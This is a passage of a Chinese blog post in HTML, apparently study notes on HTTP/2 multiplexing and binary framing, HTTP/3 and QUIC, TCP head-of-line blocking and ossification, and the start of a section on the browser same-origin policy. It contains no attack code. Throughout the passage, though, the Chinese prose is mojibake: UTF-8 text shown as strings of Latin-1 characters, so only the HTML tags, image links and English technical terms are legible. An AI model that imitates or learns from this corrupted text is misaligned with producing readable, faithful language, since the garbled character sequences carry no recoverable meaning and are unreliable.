ç®¡é“ï¼Œä½†æ˜¯åœ¨ä¸€ä¸ªç®¡é“ä¸­åŒä¸€æ—¶åˆ»åªèƒ½å¤„ç†ä¸€ä¸ªè¯·æ±‚ï¼Œåœ¨å½“å‰çš„è¯·æ±‚æ²¡æœ‰ç»“æŸä¹‹å‰ï¼Œå…¶ä»–çš„è¯·æ±‚åªèƒ½å¤„äºé˜»å¡çŠ¶æ€ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½éšæ„åœ¨ä¸€ä¸ªç®¡é“ä¸­å‘é€è¯·æ±‚å’Œæ¥æ”¶å†…å®¹ã€‚</p><p>åœ¨æµè§ˆå™¨å¤„ç†ç”Ÿæˆé¡µé¢çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯éå¸¸å¸Œæœ›èƒ½æå‰æ¥æ”¶åˆ°æ•°æ®çš„ï¼Œè¿™æ ·å°±å¯ä»¥å¯¹è¿™äº›æ•°æ®åšé¢„å¤„ç†æ“ä½œï¼Œæ¯”å¦‚æå‰æ¥æ”¶åˆ°äº†å›¾ç‰‡ï¼Œé‚£ä¹ˆå°±å¯ä»¥æå‰è¿›è¡Œç¼–è§£ç æ“ä½œï¼Œç­‰åˆ°éœ€è¦ä½¿ç”¨è¯¥å›¾ç‰‡çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥ç»™å‡ºå¤„ç†åçš„æ•°æ®äº†ï¼Œè¿™æ ·èƒ½è®©ç”¨æˆ·æ„Ÿå—åˆ°æ•´ä½“é€Ÿåº¦çš„æå‡ã€‚</p><h3 id="HTTP-2-çš„å¤šè·¯å¤ç”¨"><a href="#HTTP-2-çš„å¤šè·¯å¤ç”¨" class="headerlink" title="HTTP/2 çš„å¤šè·¯å¤ç”¨"></a>HTTP/2 çš„å¤šè·¯å¤ç”¨</h3><p>HTTP/2 çš„æ€è·¯å°±æ˜¯<strong>ä¸€ä¸ªåŸŸååªä½¿ç”¨ä¸€ä¸ª TCP é•¿è¿æ¥ <strong>æ¥ä¼ è¾“æ•°æ®ï¼Œè¿™æ ·æ•´ä¸ªé¡µé¢èµ„æºçš„ä¸‹è½½è¿‡ç¨‹åªéœ€è¦ä¸€æ¬¡æ…¢å¯åŠ¨ï¼ŒåŒæ—¶ä¹Ÿé¿å…äº†å¤šä¸ª TCP è¿æ¥ç«äº‰å¸¦å®½æ‰€å¸¦æ¥çš„é—®é¢˜ï¼›</strong>æ¶ˆé™¤é˜Ÿå¤´é˜»å¡é—®é¢˜</strong>ã€‚</p><p><img src="https://i.loli.net/2021/06/15/KUeDB5NsnkvWSz3.jpg" alt="Snipaste_2021-06-15_14-49-41.jpg"></p><p>è¯¥å›¾å°±æ˜¯ HTTP/2 æœ€æ ¸å¿ƒã€æœ€é‡è¦ä¸”æœ€å…·é¢ è¦†æ€§çš„<strong>å¤šè·¯å¤ç”¨æœºåˆ¶</strong>ã€‚ä»å›¾ä¸­ä½ ä¼šå‘ç°æ¯ä¸ªè¯·æ±‚éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ IDï¼Œå¦‚ stream1 è¡¨ç¤º index.html çš„è¯·æ±‚ï¼Œstream2 è¡¨ç¤º foo.css çš„è¯·æ±‚ã€‚è¿™æ ·åœ¨æµè§ˆå™¨ç«¯ï¼Œå°±å¯ä»¥éšæ—¶å°†è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨äº†ã€‚</p><p>æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°è¿™äº›è¯·æ±‚åï¼Œä¼šæ ¹æ®è‡ªå·±çš„å–œå¥½æ¥å†³å®šä¼˜å…ˆè¿”å›å“ªäº›å†…å®¹ï¼Œæ¯”å¦‚æœåŠ¡å™¨å¯èƒ½æ—©å°±ç¼“å­˜å¥½äº† index.html å’Œ bar.js çš„å“åº”å¤´ä¿¡æ¯ï¼Œé‚£ä¹ˆå½“æ¥æ”¶åˆ°è¯·æ±‚çš„æ—¶å€™å°±å¯ä»¥ç«‹å³æŠŠ index.html å’Œ bar.js çš„å“åº”å¤´ä¿¡æ¯è¿”å›ç»™æµè§ˆå™¨ï¼Œç„¶åå†å°† index.html å’Œ bar.js çš„å“åº”ä½“æ•°æ®è¿”å›ç»™æµè§ˆå™¨ã€‚ä¹‹æ‰€ä»¥å¯ä»¥éšæ„å‘é€ï¼Œæ˜¯å› ä¸ºæ¯ä»½æ•°æ®éƒ½æœ‰å¯¹åº”çš„ IDï¼Œæµè§ˆå™¨æ¥æ”¶åˆ°ä¹‹åï¼Œä¼šç­›é€‰å‡ºç›¸åŒ ID çš„å†…å®¹ï¼Œå°†å…¶æ‹¼æ¥ä¸ºå®Œæ•´çš„ HTTP å“åº”æ•°æ®ã€‚</p><p>HTTP/2 ä½¿ç”¨äº†å¤šè·¯å¤ç”¨æŠ€æœ¯ï¼Œå¯ä»¥å°†è¯·æ±‚åˆ†æˆä¸€å¸§ä¸€å¸§çš„æ•°æ®å»ä¼ è¾“ï¼Œè¿™æ ·å¸¦æ¥äº†ä¸€ä¸ªé¢å¤–çš„å¥½å¤„ï¼Œå°±æ˜¯å½“æ”¶åˆ°ä¸€ä¸ªä¼˜å…ˆçº§é«˜çš„è¯·æ±‚æ—¶ï¼Œæ¯”å¦‚æ¥æ”¶åˆ° JavaScript æˆ–è€… CSS å…³é”®èµ„æºçš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æš‚åœä¹‹å‰çš„è¯·æ±‚æ¥ä¼˜å…ˆå¤„ç†å…³é”®èµ„æºçš„è¯·æ±‚ã€‚</p><h3 id="å¤šè·¯å¤ç”¨çš„å®ç°"><a href="#å¤šè·¯å¤ç”¨çš„å®ç°" class="headerlink" title="å¤šè·¯å¤ç”¨çš„å®ç°"></a>å¤šè·¯å¤ç”¨çš„å®ç°</h3><p><img src="https://i.loli.net/2021/06/15/xhyXOAmt2lvpa3J.jpg" alt="Snipaste_2021-06-15_14-52-11.jpg"></p><p> HTTP/2 çš„è¯·æ±‚å’Œæ¥æ”¶è¿‡ç¨‹ï¼š</p><ul><li>é¦–å…ˆï¼Œæµè§ˆå™¨å‡†å¤‡å¥½è¯·æ±‚æ•°æ®ï¼ŒåŒ…æ‹¬äº†è¯·æ±‚è¡Œã€è¯·æ±‚å¤´ç­‰ä¿¡æ¯ï¼Œå¦‚æœæ˜¯ POST æ–¹æ³•ï¼Œé‚£ä¹ˆè¿˜è¦æœ‰è¯·æ±‚ä½“ã€‚</li><li>è¿™äº›æ•°æ®ç»è¿‡äºŒè¿›åˆ¶åˆ†å¸§å±‚å¤„ç†ä¹‹åï¼Œä¼šè¢«è½¬æ¢ä¸ºä¸€ä¸ªä¸ªå¸¦æœ‰è¯·æ±‚ ID ç¼–å·çš„å¸§ï¼Œé€šè¿‡åè®®æ ˆå°†è¿™äº›å¸§å‘é€ç»™æœåŠ¡å™¨ã€‚</li><li>æœåŠ¡å™¨æ¥æ”¶åˆ°æ‰€æœ‰å¸§ä¹‹åï¼Œä¼šå°†æ‰€æœ‰ç›¸åŒ ID çš„å¸§åˆå¹¶ä¸ºä¸€æ¡å®Œæ•´çš„è¯·æ±‚ä¿¡æ¯ã€‚</li><li>ç„¶åæœåŠ¡å™¨å¤„ç†è¯¥æ¡è¯·æ±‚ï¼Œå¹¶å°†å¤„ç†çš„å“åº”è¡Œã€å“åº”å¤´å’Œå“åº”ä½“åˆ†åˆ«å‘é€è‡³äºŒè¿›åˆ¶åˆ†å¸§å±‚ã€‚</li><li>åŒæ ·ï¼ŒäºŒè¿›åˆ¶åˆ†å¸§å±‚ä¼šå°†è¿™äº›å“åº”æ•°æ®è½¬æ¢ä¸ºä¸€ä¸ªä¸ªå¸¦æœ‰è¯·æ±‚ ID ç¼–å·çš„å¸§ï¼Œç»è¿‡åè®®æ ˆå‘é€ç»™æµè§ˆå™¨ã€‚</li><li>æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”å¸§ä¹‹åï¼Œä¼šæ ¹æ® ID ç¼–å·å°†å¸§çš„æ•°æ®æäº¤ç»™å¯¹åº”çš„è¯·æ±‚ã€‚</li></ul><p>ä»ä¸Šé¢çš„æµç¨‹å¯ä»¥çœ‹å‡ºï¼Œ<strong>é€šè¿‡å¼•å…¥äºŒè¿›åˆ¶åˆ†å¸§å±‚ï¼Œå°±å®ç°äº† HTTP çš„å¤šè·¯å¤ç”¨æŠ€æœ¯</strong>ã€‚</p><h3 id="HTTP-2-å…¶ä»–ç‰¹æ€§"><a href="#HTTP-2-å…¶ä»–ç‰¹æ€§" class="headerlink" title="HTTP/2 å…¶ä»–ç‰¹æ€§"></a>HTTP/2 å…¶ä»–ç‰¹æ€§</h3><h4 id="1-å¯ä»¥è®¾ç½®è¯·æ±‚çš„ä¼˜å…ˆçº§"><a href="#1-å¯ä»¥è®¾ç½®è¯·æ±‚çš„ä¼˜å…ˆçº§" class="headerlink" title="1. å¯ä»¥è®¾ç½®è¯·æ±‚çš„ä¼˜å…ˆçº§"></a>1. å¯ä»¥è®¾ç½®è¯·æ±‚çš„ä¼˜å…ˆçº§</h4><p>HTTP/2 æä¾›äº†è¯·æ±‚ä¼˜å…ˆçº§ï¼Œå¯ä»¥åœ¨å‘é€è¯·æ±‚æ—¶ï¼Œæ ‡ä¸Šè¯¥è¯·æ±‚çš„ä¼˜å…ˆçº§ï¼Œè¿™æ ·æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¼šä¼˜å…ˆå¤„ç†ä¼˜å…ˆçº§é«˜çš„è¯·æ±‚ã€‚</p><h4 id="2-æœåŠ¡å™¨æ¨é€"><a href="#2-æœåŠ¡å™¨æ¨é€" class="headerlink" title="2. æœåŠ¡å™¨æ¨é€"></a>2. æœåŠ¡å™¨æ¨é€</h4><p>é™¤äº†è®¾ç½®è¯·æ±‚çš„ä¼˜å…ˆçº§å¤–ï¼ŒHTTP/2 è¿˜å¯ä»¥ç›´æ¥å°†æ•°æ®æå‰æ¨é€åˆ°æµè§ˆå™¨ã€‚ä½ å¯ä»¥æƒ³è±¡è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œå½“ç”¨æˆ·è¯·æ±‚ä¸€ä¸ª HTML é¡µé¢ä¹‹åï¼ŒæœåŠ¡å™¨çŸ¥é“è¯¥ HTML é¡µé¢ä¼šå¼•ç”¨å‡ ä¸ªé‡è¦çš„ JavaScript æ–‡ä»¶å’Œ CSS æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨æ¥æ”¶åˆ° HTML è¯·æ±‚ä¹‹åï¼Œé™„å¸¦å°†è¦ä½¿ç”¨çš„ CSS æ–‡ä»¶å’Œ JavaScript æ–‡ä»¶ä¸€å¹¶å‘é€ç»™æµè§ˆå™¨ï¼Œè¿™æ ·å½“æµè§ˆå™¨è§£æå®Œ HTML æ–‡ä»¶ä¹‹åï¼Œå°±èƒ½ç›´æ¥æ‹¿åˆ°éœ€è¦çš„ CSS æ–‡ä»¶å’Œ JavaScript æ–‡ä»¶ï¼Œè¿™å¯¹é¦–æ¬¡æ‰“å¼€é¡µé¢çš„é€Ÿåº¦èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ã€‚</p><h4 id="3-å¤´éƒ¨å‹ç¼©"><a href="#3-å¤´éƒ¨å‹ç¼©" class="headerlink" title="3. å¤´éƒ¨å‹ç¼©"></a>3. å¤´éƒ¨å‹ç¼©</h4><p>HTTP/2 å¯¹è¯·æ±‚å¤´å’Œå“åº”å¤´è¿›è¡Œäº†å‹ç¼©ã€‚</p><h2 id="HTTP-3ï¼šç”©æ‰TCPã€TLS-çš„åŒ…è¢±ï¼Œæ„å»ºé«˜æ•ˆç½‘ç»œ"><a href="#HTTP-3ï¼šç”©æ‰TCPã€TLS-çš„åŒ…è¢±ï¼Œæ„å»ºé«˜æ•ˆç½‘ç»œ" class="headerlink" title="HTTP/3ï¼šç”©æ‰TCPã€TLS çš„åŒ…è¢±ï¼Œæ„å»ºé«˜æ•ˆç½‘ç»œ"></a>HTTP/3ï¼šç”©æ‰TCPã€TLS çš„åŒ…è¢±ï¼Œæ„å»ºé«˜æ•ˆç½‘ç»œ</h2><h3 id="HTTP-2-ç¼ºé™·â€”â€”TCP-çš„é˜Ÿå¤´é˜»å¡"><a href="#HTTP-2-ç¼ºé™·â€”â€”TCP-çš„é˜Ÿå¤´é˜»å¡" class="headerlink" title="HTTP/2 ç¼ºé™·â€”â€”TCP çš„é˜Ÿå¤´é˜»å¡"></a>HTTP/2 ç¼ºé™·â€”â€”TCP çš„é˜Ÿå¤´é˜»å¡</h3><p>è™½ç„¶ HTTP/2 è§£å†³äº†åº”ç”¨å±‚é¢çš„é˜Ÿå¤´é˜»å¡é—®é¢˜ï¼Œä¸è¿‡å’Œ HTTP/1.1 ä¸€æ ·ï¼ŒHTTP/2 ä¾ç„¶æ˜¯åŸºäº TCP åè®®çš„ï¼Œè€Œ TCP æœ€åˆå°±æ˜¯ä¸ºäº†å•è¿æ¥è€Œè®¾è®¡çš„ã€‚å¦‚æœåœ¨æ•°æ®ä¼ è¾“çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ªæ•°æ®å› ä¸ºç½‘ç»œæ•…éšœæˆ–è€…å…¶ä»–åŸå› è€Œä¸¢åŒ…äº†ï¼Œé‚£ä¹ˆæ•´ä¸ª TCP çš„è¿æ¥å°±ä¼šå¤„äºæš‚åœçŠ¶æ€ï¼Œéœ€è¦ç­‰å¾…ä¸¢å¤±çš„æ•°æ®åŒ…è¢«é‡æ–°ä¼ è¾“è¿‡æ¥ã€‚å‚è€ƒä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/06/15/uJN8lmU9PgQpakG.jpg" alt="Snipaste_2021-06-15_15-03-12.jpg"></p><p>æ­£å¸¸æƒ…å†µä¸‹ HTTP/2 æ˜¯æ€ä¹ˆä¼ è¾“å¤šè·¯è¯·æ±‚çš„ï¼Œä¸ºäº†ç›´è§‚ç†è§£ï¼Œå¯ä»¥å‚è€ƒä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/06/15/gOT2wPQjRy6EYSD.jpg" alt="Snipaste_2021-06-15_15-04-49.jpg"></p><p>åœ¨ HTTP/2 ä¸­ï¼Œå¤šä¸ªè¯·æ±‚æ˜¯è·‘åœ¨ä¸€ä¸ª TCP ç®¡é“ä¸­çš„ï¼Œå¦‚æœå…¶ä¸­ä»»æ„ä¸€è·¯æ•°æ®æµä¸­å‡ºç°äº†ä¸¢åŒ…çš„æƒ…å†µï¼Œé‚£ä¹ˆå°±ä¼šé˜»å¡è¯¥ TCP è¿æ¥ä¸­çš„æ‰€æœ‰è¯·æ±‚ã€‚è¿™ä¸åŒäº HTTP/1.1ï¼Œä½¿ç”¨ HTTP/1.1 æ—¶ï¼Œæµè§ˆå™¨ä¸ºæ¯ä¸ªåŸŸåå¼€å¯äº† 6 ä¸ª TCP è¿æ¥ï¼Œå¦‚æœå…¶ä¸­çš„ 1 ä¸ª TCP è¿æ¥å‘ç”Ÿäº†é˜Ÿå¤´é˜»å¡ï¼Œé‚£ä¹ˆå…¶ä»–çš„ 5 ä¸ªè¿æ¥ä¾ç„¶å¯ä»¥ç»§ç»­ä¼ è¾“æ•°æ®ã€‚</p><p>æ‰€ä»¥éšç€ä¸¢åŒ…ç‡çš„å¢åŠ ï¼ŒHTTP/2 çš„ä¼ è¾“æ•ˆç‡ä¹Ÿä¼šè¶Šæ¥è¶Šå·®ã€‚æœ‰æµ‹è¯•æ•°æ®è¡¨æ˜ï¼Œå½“ç³»ç»Ÿè¾¾åˆ°äº† 2% çš„ä¸¢åŒ…ç‡æ—¶ï¼ŒHTTP/1.1 çš„ä¼ è¾“æ•ˆç‡åè€Œæ¯” HTTP/2 è¡¨ç°å¾—æ›´å¥½ã€‚</p><h3 id="TCP-å»ºç«‹è¿æ¥çš„å»¶æ—¶"><a href="#TCP-å»ºç«‹è¿æ¥çš„å»¶æ—¶" class="headerlink" title="TCP å»ºç«‹è¿æ¥çš„å»¶æ—¶"></a>TCP å»ºç«‹è¿æ¥çš„å»¶æ—¶</h3><p>TCP çš„æ¡æ‰‹è¿‡ç¨‹ä¹Ÿæ˜¯å½±å“ä¼ è¾“æ•ˆç‡çš„ä¸€ä¸ªé‡è¦å› ç´ ã€‚HTTP/1 å’Œ HTTP/2 éƒ½æ˜¯ä½¿ç”¨ TCP åè®®æ¥ä¼ è¾“çš„ï¼Œè€Œå¦‚æœä½¿ç”¨ HTTPS çš„è¯ï¼Œè¿˜éœ€è¦ä½¿ç”¨ TLS åè®®è¿›è¡Œå®‰å…¨ä¼ è¾“ï¼Œè€Œä½¿ç”¨ TLS ä¹Ÿéœ€è¦ä¸€ä¸ªæ¡æ‰‹è¿‡ç¨‹ï¼Œè¿™æ ·å°±éœ€è¦æœ‰ä¸¤ä¸ªæ¡æ‰‹å»¶è¿Ÿè¿‡ç¨‹ã€‚</p><ol><li>åœ¨å»ºç«‹ TCP è¿æ¥çš„æ—¶å€™ï¼Œéœ€è¦å’ŒæœåŠ¡å™¨è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹æ¥ç¡®è®¤è¿æ¥æˆåŠŸï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦åœ¨æ¶ˆè€—å®Œ 1.5 ä¸ª RTT ä¹‹åæ‰èƒ½è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚</li><li>è¿›è¡Œ TLS è¿æ¥ï¼ŒTLS æœ‰ä¸¤ä¸ªç‰ˆæœ¬â€”â€”TLS1.2 å’Œ TLS1.3ï¼Œæ¯ä¸ªç‰ˆæœ¬å»ºç«‹è¿æ¥æ‰€èŠ±çš„æ—¶é—´ä¸åŒï¼Œå¤§è‡´æ˜¯éœ€è¦ 1ï½2 ä¸ª RTTã€‚</li></ol><h3 id="TCP-åè®®åƒµåŒ–"><a href="#TCP-åè®®åƒµåŒ–" class="headerlink" title="TCP åè®®åƒµåŒ–"></a>TCP åè®®åƒµåŒ–</h3><p>ç¬¬ä¸€ä¸ªæ˜¯<strong>ä¸­é—´è®¾å¤‡çš„åƒµåŒ–</strong>ã€‚è¿™äº›ä¸­é—´è®¾å¤‡æœ‰å¾ˆå¤šç§ç±»å‹ï¼Œå¹¶ä¸”æ¯ç§è®¾å¤‡éƒ½æœ‰è‡ªå·±çš„ç›®çš„ï¼Œè¿™äº›è®¾å¤‡åŒ…æ‹¬äº†è·¯ç”±å™¨ã€é˜²ç«å¢™ã€NATã€äº¤æ¢æœºç­‰ã€‚å®ƒä»¬é€šå¸¸ä¾èµ–ä¸€äº›å¾ˆå°‘å‡çº§çš„è½¯ä»¶ï¼Œè¿™äº›è½¯ä»¶ä½¿ç”¨äº†å¤§é‡çš„ TCP ç‰¹æ€§ï¼Œè¿™äº›åŠŸèƒ½è¢«è®¾ç½®ä¹‹åå°±å¾ˆå°‘æ›´æ–°äº†ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å®¢æˆ·ç«¯å‡çº§äº† TCP åè®®ï¼Œä½†æ˜¯å½“æ–°åè®®çš„æ•°æ®åŒ…ç»è¿‡è¿™äº›ä¸­é—´è®¾å¤‡æ—¶ï¼Œå®ƒä»¬å¯èƒ½ä¸ç†è§£åŒ…çš„å†…å®¹ï¼Œäºæ˜¯è¿™äº›æ•°æ®å°±ä¼šè¢«ä¸¢å¼ƒæ‰ã€‚è¿™å°±æ˜¯ä¸­é—´è®¾å¤‡åƒµåŒ–ï¼Œå®ƒæ˜¯é˜»ç¢ TCP æ›´æ–°çš„ä¸€å¤§éšœç¢ã€‚</p><p><strong>æ“ä½œç³»ç»Ÿä¹Ÿæ˜¯å¯¼è‡´ TCP åè®®åƒµåŒ–çš„å¦å¤–ä¸€ä¸ªåŸå› </strong>ã€‚å› ä¸º TCP åè®®éƒ½æ˜¯é€šè¿‡æ“ä½œç³»ç»Ÿå†…æ ¸æ¥å®ç°çš„ï¼Œåº”ç”¨ç¨‹åºåªèƒ½ä½¿ç”¨ä¸èƒ½ä¿®æ”¹ã€‚é€šå¸¸æ“ä½œç³»ç»Ÿçš„æ›´æ–°éƒ½æ»åäºè½¯ä»¶çš„æ›´æ–°ï¼Œå› æ­¤è¦æƒ³è‡ªç”±åœ°æ›´æ–°å†…æ ¸ä¸­çš„ TCP åè®®ä¹Ÿæ˜¯éå¸¸å›°éš¾çš„ã€‚</p><h3 id="QUIC-åè®®"><a href="#QUIC-åè®®" class="headerlink" title="QUIC åè®®"></a>QUIC åè®®</h3><p>HTTP/3 é€‰æ‹©åŸºäº UDP å®ç°ç±»ä¼¼äº TCP çš„å¤šè·¯æ•°æ®æµã€ä¼ è¾“å¯é æ€§ç­‰åŠŸèƒ½ï¼Œæˆ‘ä»¬æŠŠè¿™å¥—åŠŸèƒ½ç§°ä¸º<strong>QUIC åè®®</strong>ã€‚å…³äº HTTP/2 å’Œ HTTP/3 åè®®æ ˆçš„æ¯”è¾ƒï¼Œå¯ä»¥å‚è€ƒä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/06/15/2K3kybagoAHzrFI.jpg" alt="Snipaste_2021-06-15_15-10-44.jpg"></p><p>HTTP/3 ä¸­çš„ QUIC åè®®é›†åˆäº†ä»¥ä¸‹å‡ ç‚¹åŠŸèƒ½ã€‚</p><ul><li><p><strong>å®ç°äº†ç±»ä¼¼ TCP çš„æµé‡æ§åˆ¶ã€ä¼ è¾“å¯é æ€§çš„åŠŸèƒ½</strong>ã€‚è™½ç„¶ UDP ä¸æä¾›å¯é æ€§çš„ä¼ è¾“ï¼Œä½† QUIC åœ¨ UDP çš„åŸºç¡€ä¹‹ä¸Šå¢åŠ äº†ä¸€å±‚æ¥ä¿è¯æ•°æ®å¯é æ€§ä¼ è¾“ã€‚å®ƒæä¾›äº†æ•°æ®åŒ…é‡ä¼ ã€æ‹¥å¡æ§åˆ¶ä»¥åŠå…¶ä»–ä¸€äº› TCP ä¸­å­˜åœ¨çš„ç‰¹æ€§ã€‚</p></li><li><p><strong>é›†æˆäº† TLS åŠ å¯†åŠŸèƒ½</strong>ã€‚ç›®å‰ QUIC ä½¿ç”¨çš„æ˜¯ TLS1.3ï¼Œç›¸è¾ƒäºæ—©æœŸç‰ˆæœ¬ TLS1.3 æœ‰æ›´å¤šçš„ä¼˜ç‚¹ï¼Œå…¶ä¸­æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯å‡å°‘äº†æ¡æ‰‹æ‰€èŠ±è´¹çš„ RTT ä¸ªæ•°ã€‚</p></li><li><p><strong>å®ç°äº† HTTP/2 ä¸­çš„å¤šè·¯å¤ç”¨åŠŸèƒ½</strong>ã€‚å’Œ TCP ä¸åŒï¼ŒQUIC å®ç°äº†åœ¨åŒä¸€ç‰©ç†è¿æ¥ä¸Šå¯ä»¥æœ‰å¤šä¸ªç‹¬ç«‹çš„é€»è¾‘æ•°æ®æµï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚å®ç°äº†æ•°æ®æµçš„å•ç‹¬ä¼ è¾“ï¼Œå°±è§£å†³äº† TCP ä¸­é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ã€‚<img src="https://i.loli.net/2021/06/15/eHhQVw29qI1YyzO.jpg" alt="Snipaste_2021-06-15_15-11-45.jpg"></p></li><li><p><strong>å®ç°äº†å¿«é€Ÿæ¡æ‰‹åŠŸèƒ½</strong>ã€‚ç”±äº QUIC æ˜¯åŸºäº UDP çš„ï¼Œæ‰€ä»¥ QUIC å¯ä»¥å®ç°ä½¿ç”¨ 0-RTT æˆ–è€… 1-RTT æ¥å»ºç«‹è¿æ¥ï¼Œè¿™æ„å‘³ç€ QUIC å¯ä»¥ç”¨æœ€å¿«çš„é€Ÿåº¦æ¥å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§æå‡é¦–æ¬¡æ‰“å¼€é¡µé¢çš„é€Ÿåº¦ã€‚</p></li></ul><h3 id="HTTP-3-çš„æŒ‘æˆ˜"><a href="#HTTP-3-çš„æŒ‘æˆ˜" class="headerlink" title="HTTP/3 çš„æŒ‘æˆ˜"></a>HTTP/3 çš„æŒ‘æˆ˜</h3><p>ç¬¬ä¸€ï¼Œä»ç›®å‰çš„æƒ…å†µæ¥çœ‹ï¼ŒæœåŠ¡å™¨å’Œæµè§ˆå™¨ç«¯éƒ½æ²¡æœ‰å¯¹ HTTP/3 æä¾›æ¯”è¾ƒå®Œæ•´çš„æ”¯æŒã€‚</p><p>ç¬¬äºŒï¼Œéƒ¨ç½² HTTP/3 ä¹Ÿå­˜åœ¨ç€éå¸¸å¤§çš„é—®é¢˜ã€‚å› ä¸ºç³»ç»Ÿå†…æ ¸å¯¹ UDP çš„ä¼˜åŒ–è¿œè¿œæ²¡æœ‰è¾¾åˆ° TCP çš„ä¼˜åŒ–ç¨‹åº¦ï¼Œè¿™ä¹Ÿæ˜¯é˜»ç¢ QUIC çš„ä¸€ä¸ªé‡è¦åŸå› ã€‚</p><p>ç¬¬ä¸‰ï¼Œä¸­é—´è®¾å¤‡åƒµåŒ–çš„é—®é¢˜ã€‚è¿™äº›è®¾å¤‡å¯¹ UDP çš„ä¼˜åŒ–ç¨‹åº¦è¿œè¿œä½äº TCPï¼Œæ®ç»Ÿè®¡ä½¿ç”¨ QUIC åè®®æ—¶ï¼Œå¤§çº¦æœ‰ 3%ï½7% çš„ä¸¢åŒ…ç‡ã€‚</p><hr><h1 id="æµè§ˆå™¨å®‰å…¨"><a href="#æµè§ˆå™¨å®‰å…¨" class="headerlink" title="æµè§ˆå™¨å®‰å…¨"></a>æµè§ˆå™¨å®‰å…¨</h1><h2 id="åŒæºç­–ç•¥ï¼šä¸ºä»€ä¹ˆXMLHttpRequestä¸èƒ½è·¨åŸŸè¯·æ±‚èµ„æºï¼Ÿ"><a href="#åŒæºç­–ç•¥ï¼šä¸ºä»€ä¹ˆXMLHttpRequestä¸èƒ½è·¨åŸŸè¯·æ±‚èµ„æºï¼Ÿ" class="headerlink" title="åŒæºç­–ç•¥ï¼šä¸ºä»€ä¹ˆXMLHttpRequestä¸èƒ½è·¨åŸŸè¯·æ±‚èµ„æºï¼Ÿ"></a>åŒæºç­–ç•¥ï¼šä¸ºä»€ä¹ˆXMLHttpRequestä¸èƒ½è·¨åŸŸè¯·æ±‚èµ„æºï¼Ÿ</h2><p>é¡µé¢ä¸­æœ€åŸºç¡€ã€æœ€æ ¸å¿ƒçš„å®‰å…¨ç­–ç•¥ï¼š<strong>åŒæºç­–ç•¥</strong></p><h3 id="ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥"><a href="#ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥" class="headerlink" title="ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥"></a>ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥</h3><p>å¦‚æœä¸¤ä¸ª URL çš„åè®®ã€åŸŸåå’Œç«¯å£éƒ½ç›¸åŒï¼Œæˆ‘ä»¬å°±ç§°è¿™ä¸¤ä¸ª URL åŒæºã€‚æµè§ˆå™¨é»˜è®¤ä¸¤ä¸ªç›¸åŒçš„æºä¹‹é—´æ˜¯å¯ä»¥ç›¸äº’è®¿é—®èµ„æºå’Œæ“ä½œ DOM çš„ã€‚ä¸¤ä¸ªä¸åŒçš„æºä¹‹é—´è‹¥æƒ³è¦ç›¸äº’è®¿é—®èµ„æºæˆ–è€…æ“ä½œ DOMï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€å¥—åŸºç¡€çš„å®‰å…¨ç­–ç•¥çš„åˆ¶çº¦ï¼Œæˆ‘ä»¬æŠŠè¿™ç§°ä¸º<strong>åŒæºç­–ç•¥</strong>ã€‚</p><p>å…·ä½“æ¥è®²ï¼ŒåŒæºç­–ç•¥ä¸»è¦è¡¨ç°åœ¨ DOMã€Web æ•°æ®å’Œç½‘ç»œè¿™ä¸‰ä¸ªå±‚é¢ã€‚</p><p><strong>ç¬¬ä¸€ä¸ªï¼ŒDOM å±‚é¢</strong>ã€‚åŒæºç­–ç•¥é™åˆ¶äº†æ¥è‡ªä¸åŒæºçš„ JavaScript è„šæœ¬å¯¹å½“å‰ DOM å¯¹è±¡è¯»å’Œå†™çš„æ“ä½œã€‚</p><p><strong>ç¬¬äºŒä¸ªï¼Œæ•°æ®å±‚é¢</strong>ã€‚åŒæºç­–ç•¥é™åˆ¶äº†ä¸åŒæºçš„ç«™ç‚¹è¯»å–å½“å‰ç«™ç‚¹çš„ Cookieã€IndexDBã€LocalStorage ç­‰æ•°æ®ã€‚</p><p><strong>ç¬¬ä¸‰ä¸ªï¼Œç½‘ç»œå±‚é¢</strong>ã€‚åŒæºç­–ç•¥é™åˆ¶äº†é€šè¿‡ XMLHttpRequest ç­‰æ–¹å¼å°†ç«™ç‚¹çš„æ•°æ®å‘é€ç»™ä¸åŒæºçš„ç«™ç‚¹ã€‚</p><h3 id="å®‰å…¨å’Œä¾¿åˆ©æ€§çš„æƒè¡¡"><a href="#å®‰å…¨å’Œä¾¿åˆ©æ€§çš„æƒè¡¡" class="headerlink" title="å®‰å…¨å’Œä¾¿åˆ©æ€§çš„æƒè¡¡"></a>å®‰å…¨å’Œä¾¿åˆ©æ€§çš„æƒè¡¡</h3><h4 id="1-é¡µé¢ä¸­å¯ä»¥åµŒå…¥ç¬¬ä¸‰æ–¹èµ„æº"><a href="#1-é¡µé¢ä¸­å¯ä»¥åµŒå…¥ç¬¬ä¸‰æ–¹èµ„æº" class="headerlink" title="1. é¡µé¢ä¸­å¯ä»¥åµŒå…¥ç¬¬ä¸‰æ–¹èµ„æº"></a>1. 